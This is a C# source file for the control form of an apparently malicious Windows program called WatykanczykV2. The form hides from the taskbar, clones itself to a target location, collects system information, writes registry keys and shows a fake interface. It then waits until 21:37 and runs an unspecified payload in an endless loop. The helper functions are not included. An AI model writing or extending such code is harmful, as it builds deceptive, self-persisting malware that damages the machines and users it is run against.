using System;
using System.Threading;
using System.Windows.Forms;

namespace WatykanczykV2.Forms
{
    public partial class ManagerForm : Form
    {
        Functions functions;
        Settings settings;
        Random r;

        public ManagerForm()
        {
            InitializeComponent();
            functions = new Functions();
            settings = new Settings();
            r = new Random();

            this.ShowInTaskbar = false;

            if (settings.RunInTestMode)
            {
                functions.RunInTestMode();
            }
            else
            {
                NormalRun();
            }
        }

        public void NormalRun()
        {
            if (!settings.RunInTestMode)
            {
                functions.CloneToAndRunInTargetLocation();
                functions.GetInfo();
                functions.SetRegistryKeys();
                functions.StartFakeGui();

                while (true)
                {
                    if (functions.GetCurrentTime() == "21:37")
                    {
                        Payload();
                        break;
                    }
                }
            }
        }

        public void Payload()
        {
            functions.PlayMusic();
            while (true)
            {
                functions.RunPayload();
                Thread.Sleep(r.Next(2000, 5000));
            }
        }
    }
}
